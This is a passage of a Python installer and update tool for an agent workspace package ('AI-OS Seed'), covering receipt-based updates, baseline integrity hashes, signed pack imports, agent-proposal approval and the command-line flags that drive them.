        #   gated_writes.memory-hooks.entries        — now ONLY what was added
        #   gated_writes.memory-hooks.already_present — what was already wired
        #   gated_writes.memory-hooks.adopted        — wired before we arrived
        #   gated_writes.memory-hooks.prior_bytes_len — replaces prior_bytes,
        #       which copied the user's whole settings.json (API key and all)
        #       into the receipt AND the out-of-target anchor
        #   install.package_sha              — the dist the install came from
        # Nothing READS `schema`, and every reader of the fields above uses
        # .get() with a default, so a schema-1 receipt keeps working: a
        # missing refused_skills is no refusals, a missing prior_bytes_len is
        # simply not reported, and prior_bytes on an old receipt is left alone
        # rather than rewritten (an uninstall removes it with the receipt).
        # Migration note: docs/install-audit.md.
        "schema": 2,
        "install": {
            "target": str(target), "mode": "adopted",
            "installer_version": _installer_version_of(target),
            "installer_commit": "unknown",
            "components": [c for c in COMPONENTS if c in present],
            "skipped": [], "at": _now(),
        },
        "baseline": {}, "gated_writes": {}, "shipped": shipped,
    }
    (target / CC_SEED_DIR).mkdir(parents=True, exist_ok=True)
    _save_receipt(target, receipt)
    print(f"adopted: recorded {len(shipped)} path(s) under {len(present)} shipped "
         f"location(s) as this install's baseline (version "
         f"{receipt['install']['installer_version']}). This is NOT a claim about "
         f"where that content came from — only that, from now on, --update treats "
         f"exactly what's on disk today as the known-good reference point. Run "
         f"--update to check for anything newer.")
    return 0


def _redecide_skill_origins(target: Path, receipt: dict) -> int:
    """Re-ask the ORIGIN question for every shipped skill that is not already
    correctly registered, and reconcile the receipt. Returns how many were
    newly registered.

    This is the repair path for a REFUSED skill. Until 2026-09-19 there wasn't
    one: the refusal left no link and no record, and `--update` returned early
    on "already current (version X) — nothing to do" (and again on "nothing to
    apply"), so removing the colliding user-scope file and re-running --update
    --apply exited 0 and still registered nothing (2026-09-19 review, finding
    5, executed as refused_skill_retry). "No files to write" is not "nothing to
    do"."""
    registered, deferred, refused, seen = _register_new_skills(target)
    _merge_deferred(receipt, deferred)
    _merge_refused(receipt, refused, seen)
    regs = receipt["install"].setdefault("registered_skills", [])
    for name in registered:
        if name not in regs:
            regs.append(name)
    if registered or refused or seen:
        _save_receipt(target, receipt)
    if registered:
        print(f"registered {len(registered)} skill(s) whose origin question could "
              f"now be answered: {', '.join(registered)}")
    return len(registered)


def do_update(target: Path, from_arg: str, apply: bool, allow_downgrade: bool) -> int:
    if not looks_like_install(target):
        return die(f"{target} doesn't look like an AI-OS Seed install (no PRINCIPLES.md + "
                   f"scheduler/manifest.yml) — --update only operates on an existing install")
    receipt = _load_receipt(target)
    if receipt is None:
        return die(f"{target}: no {CC_SEED_DIR}/{RECEIPT_NAME} — this install predates receipts "
                   f"entirely (pre-Wave-2H) and --update has no baseline to reason from safely; "
                   f"reinstall fresh into a new directory instead")
    with _update_lock(target):
        with tempfile.TemporaryDirectory(prefix="cc-seed-update-") as tmp:
            tmp_p = Path(tmp)
            try:
                new_tree, new_version, source_desc = _resolve_update_source(from_arg, tmp_p)
            except RuntimeError as e:
                return die(f"update: {e}")
            current_version = ((receipt.get("install") or {}).get("installer_version")
                               or _installer_version_of(target))
            if (current_version not in (None, "unknown") and new_version != "unknown"
                    and _version_key(new_version) < _version_key(current_version)
                    and not allow_downgrade):
                return die(f"update: fetched version {new_version!r} is OLDER than the "
                          f"installed {current_version!r} — refusing (pass --allow-downgrade "
                          f"if this is deliberate, e.g. --from a specific local clone)")
            if new_version != "unknown" and new_version == current_version:
                print(f"update: already current (version {current_version}).")
                if apply:
                    _redecide_skill_origins(target, receipt)
                    # Same-version is still the moment to repair the two things
                    # an old installer could not give this tree: its baseline
                    # measurement and the installer itself. Without this, an
                    # install that is already current is UNREPAIRABLE — there
                    # is no other verb, and "already current" returns before
                    # any plan is computed (found on {{REDACTED}}, 2026-09-19).
                    changed = _refresh_installer(target, new_tree)
                    if not receipt["install"].get("installed_sha"):
                        _record_installed_sha(target, receipt)
                        changed = True
                        print("recorded this install's baseline measurement "
                              "(installed_sha) — it had none.")
                    if changed:
                        _save_receipt(target, receipt)
                else:
                    print("  (dry run — pass --apply to re-ask the skill origin "
                          "question for anything refused or unregistered)")
                return 0

            shipped_now = receipt.get("shipped")
            bootstrapped = False
            if shipped_now is None:
                shipped_now = _reconstruct_legacy_shipped(receipt, tmp_p)
                if shipped_now is None:
                    print("update: no per-file 'shipped' history on this receipt, and the "
                          "recorded installer_commit couldn't be fetched to reconstruct one — "
                          "every existing shipped path will be treated as unverified and "
                          "SKIPPED (only genuinely NEW paths will be created). Run again once "
                          "network/commit access is available to get real update coverage.",
                          file=sys.stderr)
                    shipped_now = {}
                else:
                    bootstrapped = True
                    print(f"update: no receipt['shipped'] history — reconstructed it by "
                          f"fetching this install's original commit "
                          f"({receipt['install'].get('installer_commit', '?')[:12]}) for "
                          f"comparison.")

            plan, new_snap = _plan_update(target, shipped_now, new_tree)
            print(f"update: {source_desc} (version {new_version}) vs installed "
                  f"{current_version or 'unknown'}")
            print(f"  {len(plan['create'])} to create, {len(plan['update'])} to update, "
                  f"{len(plan['skip_dirty'])} skipped (locally modified or unverified), "
                  f"{len(plan['manual_only'])} needs manual review, "
                  f"{len(plan['unchanged'])} already current")
            for rel in plan["create"]:
                print(f"  [CREATE] {rel}")
            for rel in plan["update"]:
                print(f"  [UPDATE] {rel}")
            for rel in plan["skip_dirty"]:
                print(f"  [SKIP  ] {rel} — locally modified since install, not touched")
            for rel in plan["manual_only"]:
                if rel.split("/", 1)[0] in UPDATE_MANUAL_ONLY_COMPONENTS:
                    why = "this is your live, personal workspace, not shipped content"
                else:
                    why = "install() synthesizes this file (e.g. splices in your live scheduled jobs)"
                print(f"  [MANUAL] {rel} — {why}; --update never touches it automatically. "
                     f"Compare it by hand against the new tree if you want anything it added.")

            if not apply:
                print("\n(dry run — pass --apply to write these changes)")
                return 0
            if not plan["create"] and not plan["update"]:
                # No FILES to write is not the same as nothing to DO. A skill
                # refused at install (a different user-scope twin) leaves no
                # link, and the only way to repair it is to re-ask the origin
                # question — which used to be unreachable, because the same
                # version had nothing to apply and this branch returned first.
                # Remove the collision, re-run --update --apply, exit 0, still
                # no link (2026-09-19 review, finding 5, executed as
                # refused_skill_retry). The origin question is re-asked here.
                if bootstrapped:
                    receipt["shipped"] = shipped_now
                # An install that is ALREADY current still needs a baseline.
                # installed_sha was only ever recorded on a non-empty apply, so
                # a tree that reached the current version before R2 shipped
                # could never obtain one: M0-package-integrity failed forever
                # ("the receipt does not say what this install wrote"), with no
                # verb that could fix it. An empty plan means the shipped bytes
                # MATCHED the fetched tree, which is precisely a verified-clean
                # moment, so recording here is sound. Only when ABSENT — this
                # must never re-baseline a tree that already has one, which is
                # the tamper-laundering path the R2 comment below guards.
                sha_recorded = False
                if not receipt["install"].get("installed_sha"):
                    _record_installed_sha(target, receipt)
                    sha_recorded = True
                    print("recorded this install's baseline measurement "
                          "(installed_sha) — it had none.")
                refreshed = _refresh_installer(target, new_tree)
                if not _redecide_skill_origins(target, receipt) \
                        and not sha_recorded and not refreshed:
                    print("\nnothing to apply.")
                elif bootstrapped or sha_recorded:
                    _save_receipt(target, receipt)
                return 0

            _apply_update(target, receipt, new_tree, plan, new_snap)
            newly_registered, newly_deferred, newly_refused, seen_names = \
                _register_new_skills(target)
            _merge_deferred(receipt, newly_deferred)
            _merge_refused(receipt, newly_refused, seen_names)
            # SEED-080 (the SEED-076 receipt-audit bug): --update refreshed
            # receipt["shipped"] but never extended install.components or
            # install.registered_skills — and _check_1 enumerates from exactly
            # those two fields. A component that arrived by update was
            # therefore never audited: not compared against the package, and
            # (worse) reported as an unexpected path by the sweep at the end.
            # Silent, and it got quieter the more the seed grew.
            comps = receipt["install"].setdefault("components", [])
            for rel in sorted(set(plan["create"]) | set(plan["update"])):
                top = rel.split("/", 1)[0]
                if top in COMPONENTS and top not in comps:
                    comps.append(top)
            regs = receipt["install"].setdefault("registered_skills", [])
            for name in newly_registered:
                if name not in regs:
                    regs.append(name)
            updates = receipt.get("updates") or []
            updates.append({
                "at": _now(), "from_version": current_version, "to_version": new_version,
                "source": source_desc, "created": plan["create"], "updated": plan["update"],
                "skipped_dirty": plan["skip_dirty"], "bootstrapped_shipped_history": bootstrapped,
            })
            receipt["updates"] = updates
            receipt["install"]["installer_version"] = new_version
            # R2: an update legitimately rewrites shipped bytes, so the
            # measurement is retaken here. Only install and update refresh it —
            # an --audit or --approve run must never re-baseline a tampered
            # tree, which is the whole point of recording it.
            _record_installed_sha(target, receipt)
            _refresh_installer(target, new_tree)
            _save_receipt(target, receipt)
            print(f"\napplied: {len(plan['create'])} created, {len(plan['update'])} updated. "
                 f"{len(plan['skip_dirty'])} locally-modified path(s) left untouched — review "
                 f"the SKIP list above if any of those needed the update too.")
            if newly_registered:
                print(f"registered {len(newly_registered)} new skill(s): "
                     f"{', '.join(newly_registered)}")
            return 0


def _installer_version_of(target: Path) -> str:
    vf = target / "VERSION"
    return vf.read_text().strip() if vf.exists() else "unknown"


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--target", help="install root (absolute path)")
    ap.add_argument("--into", action="store_true",
                    help="compose into an EXISTING workspace at --target (per-name "
                         "collision check; your content is never touched)")
    ap.add_argument("--detect", action="store_true",
                    help="read-only: report prior seed installs/clones on this machine")
    ap.add_argument("--enable-demo", action="store_true",
                    help="add the hello_fleet demo to the scheduler manifest")
    ap.add_argument("--enable-governance", action="store_true",
                    help="copy the governance/ profile-compiler into an existing install "
                         "(opt-in only — never part of the default install)")
    ap.add_argument("--approve", choices=sorted(GATED_WRITES),
                    help="record approval + perform the write for a staged gated write — "
                         "claude-md needs .cc-seed/staged/claude-md.proposed staged first; "
                         "mesh-bootstrap runs memory-mesh/install.sh itself; import-pack "
                         "needs --from-pack <path>")
    ap.add_argument("--from-pack", help="with --approve import-pack: a verified pack DIRECTORY to import")
    ap.add_argument("--set-engagement",
                     help="record which engagement THIS TARGET is operating under (the "
                          "authorization anchor tagged packs are checked against — see "
                          "--set-engagement's own function docstring for the 2026-08-09 fix "
                          "history). Refuses to silently switch an already-set engagement "
                          "unless --force is also given")
    ap.add_argument("--force", action="store_true",
                     help="with --set-engagement: allow switching a target's already-set "
                          "engagement to a different one. Does NOT purge or isolate any "
                          "already-imported pack content from the old engagement — a "
                          "switch co-mingles it with whatever imports next unless you "
                          "--remove-pack each one first (--list-packs to review). "
                          "Operator discipline, by deliberate choice, not automation.")
    ap.add_argument("--tag",
                     help="with --approve import-pack: an OPTIONAL redundant confirmation, "
                          "checked against this target's recorded engagement (--set-engagement) "
                          "— not itself the authorization source. A pack whose own pack.json "
                          "tags[] is non-empty is refused unless the target's recorded "
                          "engagement matches one of them; an untagged pack always imports "
                          "regardless")
    ap.add_argument("--replace", action="store_true",
                    help="with --approve import-pack: overwrite a leftover, unrecorded "
                         "delivery-root directory for this pack id")
    ap.add_argument("--allowed-signers", default=None,
                     help="with --approve import-pack: signer registry path used to verify "
                          "a pack's signature. A replica-audience pack defaults to requiring "
                          "a VERIFIED signature to import — omitting this flag on a signed "
                          "pack refuses (verification-error), it does not silently skip the "
                          "check. This tool never probes a default location.")
    ap.add_argument("--allow-unsigned", action="store_true",
                     help="with --approve import-pack: explicit break-glass to import a "
                          "replica-audience pack that carries NO signature at all — recorded "
                          "loudly in the receipt. Has no effect on a pack whose signature is "
                          "present but invalid/unknown-signer/verification-error; those "
                          "states have no override.")
    ap.add_argument("--list-packs", action="store_true", help="list packs imported into this target")
    ap.add_argument("--remove-pack",
                     help="pack id to remove: deletes its delivery-root content and receipt "
                          "entry, regenerates PACKS.md")
    ap.add_argument("--audit", action="store_true",
                    help="deterministic post-install auditor — compares live state against "
                         "the install receipt and --package's pristine manifest")
    ap.add_argument("--package", help="path to the pristine clone dir to audit against (required with --audit)")
    ap.add_argument("--json", action="store_true", help="with --audit, emit the report as JSON")
    ap.add_argument("--uninstall", action="store_true",
                    help="de-schedule managed jobs and remove the install")
    ap.add_argument("--apply-proposal", metavar="SLUG",
                    help="SEED-072: apply an agent-written proposal at "
                         ".cc-seed/staged/proposals/SLUG.json — hash-checked against the "
                         "target's current content before anything is written, allowlisted "
                         "to scheduler-entry changes in this build (PROPOSALS.md)")
    ap.add_argument("--confirm", metavar="TOKEN",
                    help="SEED-077: with --apply-proposal on a single-apply-only target "
                         "(.claude/settings.json): the token printed beside that proposal's "
                         "full diff. Without it the apply shows the diff and writes nothing")
    ap.add_argument("--revert-proposal", metavar="SLUG",
                    help="undo a previously-applied proposal, refusing if the target has "
                         "changed since --apply-proposal ran")
    ap.add_argument("--review-proposals", action="store_true",
                    help="SEED-077: read-only report of every staged proposal — target, "
                         "rationale, diff size, and whether apply would take it right now")
    ap.add_argument("--apply-proposals", action="store_true",
                    help="SEED-077: apply ALL staged proposals through the same per-item "
                         "guards as --apply-proposal; refusals are skipped and reported, "
                         "exit is nonzero if any item was refused")
    ap.add_argument("--revoke", choices=sorted(REVOCABLE_WRITES),
                    help="undo a gated write, removing exactly the entries its "
                         "approval recorded and restoring the prior shape")
    ap.add_argument("--contract", action="store_true",
                    help="run memory-mesh/contract_test.py against this install "
                         "(the six properties that define 'the memory works')")
    ap.add_argument("--harness", choices=["claude", "codex", "grok"],
                    help="with --contract: also run the harness half against this CLI")
    ap.add_argument("--update", action="store_true",
                    help="SEED-076: check this install against the latest published cc-seed "
                         "content (pinned to an immutable release tag — never a mutable "
                         "branch). Reports create/update/skip-as-locally-modified for every "
                         "shipped path and writes NOTHING unless --apply is also given.")
    ap.add_argument("--from", dest="update_from", metavar="PATH",
                    help="with --update: a LOCAL seed clone/dist directory to update from "
                         "instead of fetching the pinned release — never a URL. For offline "
                         "use or testing against an unpublished build you already trust.")
    ap.add_argument("--apply", action="store_true",
                    help="with --update: actually write the planned changes (default is a "
                         "dry-run report only)")
    ap.add_argument("--allow-downgrade", action="store_true",
                    help="with --update: permit installing a version OLDER than what's "
                         "currently installed (refused by default)")
    ap.add_argument("--adopt-baseline", action="store_true",
                    help="SEED-076: for an install that predates the receipt system "
                         "entirely (no .cc-seed/receipt.json at all) — records current "
                         "on-disk content as the operator-approved baseline so --update "
                         "has real history to compare against, going forward. Refuses if "
                         "a receipt already exists. Never called implicitly by --update.")
    args = ap.parse_args()

    if args.detect:
        # Enumerated from the PARSER, not from a hand-maintained list of
        # flags. The hand-maintained one silently stopped covering new
        # operations: `--detect --revoke memory-hooks --apply`,
        # `--detect --contract` and `--detect --update` all returned 0 having
        # run only the survey, never the operation the caller asked for
        # (2026-09-19 review, finding 14, executed as
        # parse_ignored_operation). Anything a future wave adds is covered on
        # the day it is added.
        DETECT_COMPATIBLE = {"detect", "from_pack", "verbose"}
        defaults = ap.parse_args([])
        combined = sorted(
            k for k, v in vars(args).items()
            if k not in DETECT_COMPATIBLE and v != getattr(defaults, k, None))
        if combined:
            return die(f"--detect takes no other flags (it's a read-only report); "
                       f"got: {', '.join('--' + c.replace('_', '-') for c in combined)}")
        return detect()
    if not args.target:
        return die("--target is required (or use --detect for a read-only survey)")

    target = Path(args.target).expanduser()
    if not target.is_absolute():
        return die(f"--target must be an absolute path, got {args.target!r}")
    exclusive = [args.enable_demo, args.enable_governance, args.uninstall, args.approve, args.audit,
                 args.list_packs, bool(args.remove_pack), bool(args.set_engagement),
                 bool(args.apply_proposal), bool(args.revert_proposal),
                 args.review_proposals, args.apply_proposals, args.update,
                 args.adopt_baseline, bool(args.revoke), args.contract]
    if sum(bool(x) for x in exclusive) > 1:
        return die("--enable-demo, --enable-governance, --uninstall, --approve, --audit, "
                   "--list-packs, --remove-pack, --set-engagement, --apply-proposal, "
                   "--revert-proposal, --review-proposals, --apply-proposals, --update, "
                   "--adopt-baseline, --revoke and --contract are mutually exclusive")
    if args.into and any(exclusive):
        return die("--into only applies to the initial install")
    if args.confirm and not args.apply_proposal:
        return die("--confirm only applies to --apply-proposal")
    if args.json and not args.audit:
        return die("--json only applies to --audit")
    if args.package and not args.audit:
        return die("--package only applies to --audit")
    if args.from_pack and args.approve != "import-pack":
        return die("--from-pack only applies to --approve import-pack")
    if args.replace and args.approve != "import-pack":
        return die("--replace only applies to --approve import-pack")
    if args.tag and args.approve != "import-pack":
        return die("--tag only applies to --approve import-pack")
    if args.allowed_signers and args.approve != "import-pack":
        return die("--allowed-signers only applies to --approve import-pack")
    if args.allow_unsigned and args.approve != "import-pack":
        return die("--allow-unsigned only applies to --approve import-pack")
    if args.force and not args.set_engagement:
        return die("--force only applies to --set-engagement")
    if args.approve == "import-pack" and not args.from_pack:
        return die("--approve import-pack requires --from-pack <path>")
    if args.update_from and not args.update:
        return die("--from only applies to --update")
    if args.apply and not (args.update or args.approve or args.revoke):
        return die("--apply only applies to --update, --approve and --revoke")
    if args.harness and not args.contract:
        return die("--harness only applies to --contract")
    if args.allow_downgrade and not args.update:
        return die("--allow-downgrade only applies to --update")

    if args.contract:
        return contract(target, args.harness)
    if args.revoke:
        return revoke(target, args.revoke)
    if args.update:
        return do_update(target, args.update_from, args.apply, args.allow_downgrade)
    if args.adopt_baseline:
        return do_adopt_baseline(target)
    if args.uninstall:
        return uninstall(target)
    if args.enable_demo:
        return enable_demo(target)
    if args.enable_governance:
        return enable_governance(target)
    if args.list_packs:
        return list_packs(target)
    if args.remove_pack:
        return remove_pack(target, args.remove_pack)
    if args.set_engagement:
        return set_engagement(target, args.set_engagement, args.force)
    if args.approve:
        return approve(target, args.approve, from_pack=args.from_pack, replace=args.replace, tag=args.tag,
                        allowed_signers=args.allowed_signers, allow_unsigned=args.allow_unsigned)
    if args.audit:
        if not args.package:
            return die("--audit requires --package <clone-dir>")
        return do_audit(target, Path(args.package).expanduser(), args.json)
    if args.apply_proposal:
        return apply_proposal(target, args.apply_proposal, confirm=args.confirm)
    if args.revert_proposal:
        return revert_proposal(target, args.revert_proposal)
    if args.review_proposals:
        return review_proposals(target)
    if args.apply_proposals:
        return apply_proposals(target)
    return install(target, into=args.into)


if __name__ == "__main__":
    sys.exit(main())
